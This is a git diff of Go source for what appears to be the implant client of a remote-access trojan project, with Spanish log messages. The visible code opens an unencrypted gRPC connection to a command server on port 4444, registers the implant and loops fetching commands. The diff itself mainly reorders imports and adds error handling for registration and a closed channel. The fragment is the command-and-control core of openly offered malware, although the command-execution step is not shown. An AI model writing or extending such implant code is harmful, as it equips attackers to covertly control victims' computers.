@@ -2,14 +2,15 @@ package main
 
 import (
 	"context"
-	"github.com/charmbracelet/log"
-	"github.com/iortego42/go-rat/grpcapi"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials/insecure"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
+
+	"github.com/charmbracelet/log"
+	"github.com/iortego42/go-rat/grpcapi"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials/insecure"
 )
 
 func main() {
@@ -21,7 +22,6 @@ func main() {
 	)
 	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
 	conn, err = grpc.NewClient("127.0.0.1:4444", opts...)
-
 	if err != nil {
 		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
 	}
@@ -36,9 +36,17 @@ func main() {
 	}
 
 	identity, err = client.RegisterImplant(ctx, identity)
+	if err != nil {
+		log.Warn("Hubo un error al registrar el implant")
+		log.Error("", "Error", err.Error())
+		return
+	}
 	for {
 		cmd, err := client.FetchCommand(ctx, identity)
 		// log a eliminar
+		if err != nil && err.Error() == "channel closed" {
+			return
+		}
 		if err != nil {
 			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
 		}
